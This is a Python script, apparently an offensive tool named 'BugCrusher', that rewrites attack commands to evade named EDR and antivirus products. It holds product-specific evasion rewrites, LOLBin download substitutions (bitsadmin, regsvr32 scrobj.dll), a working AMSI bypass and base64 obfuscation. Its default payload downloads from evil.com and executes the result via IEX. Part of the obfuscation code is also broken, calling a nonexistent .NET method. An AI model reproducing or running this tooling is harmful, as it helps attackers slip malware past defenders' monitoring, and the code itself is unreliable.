#!/usr/bin/env python3
"""
BugCrusher — EDR/Security Evasion Mutator
Mutates payloads to bypass EDR, AV, and sandbox detection.
"""

import re, random, base64

EDR_MUTATIONS = {
    "crowdstrike": {
        "triggers": [r"powershell.*-W\s+hidden.*-C", r"powershell.*-enc"],
        "mutations": [
            ("-W hidden", "-NonInteractive -WindowStyle Hidden"),
            ("-C ", "-Command "),
            ("-enc ", "-EncodedCommand "),
        ]
    },
    "sentinelone": {
        "triggers": [r"certutil.*-urlcache.*-f"],
        "mutations": [
            ("certutil -urlcache -f", "bitsadmin /transfer myjob /download /priority normal"),
            ("Invoke-WebRequest", "(New-Object Net.WebClient).DownloadData"),
            ("iwr ", "(New-Object Net.WebClient).DownloadData("),
        ]
    },
    "carbon_black": {
        "triggers": [r"mshta.*vbscript", r"mshta.*javascript"],
        "mutations": [
            ("mshta vbscript:", "mshta.exe "),
            ("mshta javascript:", "mshta.exe "),
            ("vbscript:Execute", "C:\\Windows\\Temp\\temp.vbs"),
        ]
    },
    "defender": {
        "triggers": [r"rundll32.*javascript:", r"rundll32.*mshtml"],
        "mutations": [
            ("rundll32 javascript:", "regsvr32 /s /n /u /i:scrobj.dll"),
            ("rundll32 mshtml", "regsvr32 /s /n /u /i:scrobj.dll"),
        ]
    },
    "amsi": {
        "triggers": [r"Invoke-Expression", r"IEX", r"iex\s"],
        "mutations": [
            ("IEX ", "$env:POWERSHELL_UPDATECONTEXT"),
            ("Invoke-Expression", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);iex"),
            ("iex ", "$env:POWERSHELL_UPDATECONTEXT || iex "),
        ]
    }
}

LOLBAS_COMPLIANT = {
    "powershell": {
        "safe_flags": ["-NonInteractive", "-WindowStyle Hidden", "-ExecutionPolicy Bypass", "-NoProfile"],
        "unsafe_flags": ["-W hidden", "-enc", "-C "],
        "fix": lambda cmd: re.sub(r'-W\s+hidden', '-WindowStyle Hidden', cmd).replace('-enc ', '-EncodedCommand ').replace('-C ', '-Command ')
    },
    "cmd": {
        "safe_commands": ["cmd /c", "cmd /k"],
        "unsafe_commands": [],
        "fix": lambda cmd: cmd
    },
    "certutil": {
        "safe_flags": ["-decode", "-encode"],
        "unsafe_flags": ["-urlcache", "-split", "-f"],
        "fix": lambda cmd: cmd  # No safe alternative, avoid entirely
    },
    "mshta": {
        "safe_usage": ["file-based .hta"],
        "unsafe_usage": ["inline vbscript", "inline javascript"],
        "fix": lambda cmd: re.sub(r'(vbscript|javascript):', '.hta file: ', cmd)
    }
}

def mutate_for_edr(payload: str, edr_type: str = None) -> str:
    """Mutate payload for specific EDR or general evasion."""
    result = payload
    
    # Apply EDR-specific mutations
    if edr_type and edr_type in EDR_MUTATIONS:
        for old, new in EDR_MUTATIONS[edr_type]["mutations"]:
            result = result.replace(old, new)
    
    # General PowerShell cleanup
    result = LOLBAS_COMPLIANT["powershell"]["fix"](result)
    
    # Add AMSI bypass if needed
    if any(un in result.lower() for un in ["invoke", "iex", "webrequest"]):
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        if amsi_bypass not in result:
            result = amsi_bypass + result
    
    # Obfuscate strings
    if len(result) > 50 and random.random() > 0.5:
        encoded = base64.b64encode(result.encode()).decode()
        result = f"(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([Memory]::Compress([byte[]][Convert]::FromBase64String('{encoded}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII))).ReadToEnd()"
    
    return result

def check_lolbas_compliance(command: str) -> dict:
    """Check if command uses LOLBAS-compliant binaries."""
    issues = []
    recommendations = []
    
    # Check PowerShell
    if "powershell" in command.lower():
        for bad in LOLBAS_COMPLIANT["powershell"]["unsafe_flags"]:
            if bad in command:
                issues.append(f"PowerShell unsafe flag: {bad}")
                recommendations.append(LOLBAS_COMPLIANT["powershell"]["fix"](command))
    
    # Check certutil
    if "certutil" in command.lower():
        for bad in LOLBAS_COMPLIANT["certutil"]["unsafe_flags"]:
            if bad in command:
                issues.append(f"certutil unsafe flag: {bad} (detected by Defender)")
                recommendations.append("Use bitsadmin or net.webclient instead")
    
    return {"compliant": len(issues) == 0, "issues": issues, "recommendations": recommendations}

if __name__ == '__main__':
    import sys
    payload = sys.argv[1] if len(sys.argv) > 1 else "powershell -W hidden -C \"IEX (Invoke-WebRequest -Uri http://evil.com/shell.exe).Content\""
    edr = sys.argv[2] if len(sys.argv) > 2 else None
    
    mutated = mutate_for_edr(payload, edr)
    compliance = check_lolbas_compliance(mutated)
    
    print(f"Original:\n  {payload}\n")
    print(f"Mutated:\n  {mutated}\n")
    print(f"LOLBAS Compliance: {compliance['compliant']}")
    if compliance['issues']:
        print(f"Issues: {compliance['issues']}")
        print(f"Fix: {compliance['recommendations']}")
